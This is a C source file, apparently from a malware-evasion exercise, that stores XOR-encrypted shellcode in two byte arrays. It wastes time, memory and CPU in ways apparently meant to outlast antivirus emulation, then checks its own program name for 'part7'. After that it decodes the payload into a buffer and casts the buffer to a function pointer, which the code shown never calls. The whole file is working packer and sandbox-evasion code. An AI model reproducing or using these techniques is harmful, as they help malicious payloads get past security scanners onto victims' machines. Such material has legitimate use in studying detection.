#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/types.h>

unsigned char bye[] = "Bye world";

unsigned char ebuf[] =
  "\xfc\xe9\x8b\x03\x04\x05\x66\x8e\xed\x38\xd8\x6f\x87\x5f\x3e"
  "\x84\x42\x1d\x99\x41\x00\x9e\x64\x3f\x17\xae\x50\x3d\x2d\xe2"
  "\x2f\xdf\x8c\x1d\x43\x5f\x26\x09\x06\xe6\xe7\x24\x2b\xec\xce"
  "\xdd\x7c\x78\xbb\x63\x22\xb8\x76\x09\x37\xe7\xb3\x79\x42\xbe"
  "\xfc\x49\x74\x3e\x90\x11\xc9\x0b\x5c\xce\x1e\x67\x49\x9a\xa9"
  "\x77\x05\xc6\x7a\xc4\x51\x87\x63\xac\x65\x95\xfa\x96\x97\x54"
  "\x5b\x9c\x64\xbd\x2b\xab\x63\x1c\x9a\x58\x19\x41\x13\x85\x30"
  "\xe2\x32\x4f\x6d\xbe\x08\xe4\x7c\x3a\xf9\x2b\x68\x74\xa5\xfc"
  "\x7c\xf2\x7b\xab\xf5\x39\x5a\x5b\xdb\xda\xe3\xda\xde\xd4\x79";

unsigned char hi[] = "Hello world";

unsigned char ebuf1[] =
  "\x67\xd0\xd6\xd0\x00\x9e\x66\x08\xd2\xf8\xa2\xa0\x93\x94\xfd"
  "\xe1\xe4\xaa\xc6\xce\xf3\xd0\xea\xb8\x98\x5f\x74\x1a\x33\xa5"
  "\xa5\xa6\x8e\x6c\xfd\xfa\xc3\x85\x2d\xc5\xaf\x4f\x64\xe2\xe3"
  "\xe4\xe5\xf6\xe7\xf8\xe9\xd2\x51\xb3\x62\x5e\x40\x15\x56\xf3"
  "\x18\x97\xad\xc4\xc7\xc8\x99\x43\x2d\xa6\xdd\x98\x98\xb8\x13"
  "\x09\xe4\xb3\x2a\x03\x84\x8f\xb1\x6d\x32\xe4\x22\x21\x0a\xb3"
  "\xb2\xb5\x8b\x90\x09\xdd\x06\x17\x3c\xbd\x7c\x84\x98\x80\xa2"
  "\x91\x0e\x27\x99\xf4\x9f\xf2\xa1\xaf\x91\xf8\x22\x34\xa2\x01"
  "\x2a\x8b\x37\x68\x43\x6c\x05\x16\x07\x08\x5f\x60\x0b\x64\x55"
  "\xaa\x5c\xf5\xee\xc7\x80\x47\x7f\x16\x41\x4b\x4e\x72\x19\xc5"
  "\xd5\x41\xe0\xf5\x20\xe1\x0a\xe2\xa0\xd0\x52\xc4\xea";

int i = 42;
int counter = 0;

int getk(int i)
{
  if (i==500)
    return 25;
  if (i==425)
    return 19;

  return 0;
}

int recfunc(char *tempbuf)
{
  if (tempbuf[0] == '\0')
    return 0;
  counter++;
  return 1 + recfunc(tempbuf+1);
}

int main(int argc, char **argv)
{
  unsigned char newbuf[512];
  int bufsz;
  int j;
  int k;
  int ret;
  int recret;
  /* Declare pointer on function */
  void (*func) ();
  char *temp;
  clock_t start,end;
  double btwn;
  double elap;

  elap = 0;
  i = 15;
  
  while (elap < 600)
    {
      start = clock();
      end = clock();
      btwn = ((double) (end-start) / CLOCKS_PER_SEC);
      elap += btwn;
      i = 20;
    }

  if (elap < 600)
    i = 37;
  else
    i = 0;
  
  bufsz = sizeof(ebuf) - 1;

  /* waste memory */
  temp = (char*)malloc(10000000*sizeof(char));
  memset(temp, 't', 10000000*sizeof(char));
  temp = (char*)realloc(temp,10000008);
  temp[9999999] = '\0';
  temp = (char*)realloc(temp,10000);
  temp[9999] = '\0';

  /* waste cpu time and create lots of stack frames*/
  ret = recfunc(temp);
  /* why not waste even more cpu time? */
  for (j=0; j<(10*ret); ++j)
    {
      recret = recfunc(temp);
    }
  

  /* decrypt part of packed shellcode */
  if (j != 0 && strstr(argv[0],"part7") != NULL)
    {
      for (k=getk(i); i<bufsz; ++i)
	{
	  newbuf[i] = ebuf[i] ^ (k%256);
	  if (getk(i) == 0)
	    k++;
	}
    }

  if (i == bufsz)
    {
      for (i=0; i<sizeof(ebuf1); ++i)
	{
	  newbuf[k] = ebuf1[i] ^ (k%256);
	  ++k;
	}
    }
  /*memcpy(ebuf,ebuf+11,k*sizeof(char));
    memset(ebuf+k,0,11);*/


  //debug
  /*for (i=0; i<bufsz+sizeof(ebuf1); ++i)
    {
      printf("\\x%02x", ((unsigned char*)newbuf)[i]);
      if (i%15 == 0 && i != 0)
	printf("\n");
    }

  printf("\n");
  */
  
  
  func = (void (*) ()) newbuf;
  
  free(temp);

  return i+ret;

}
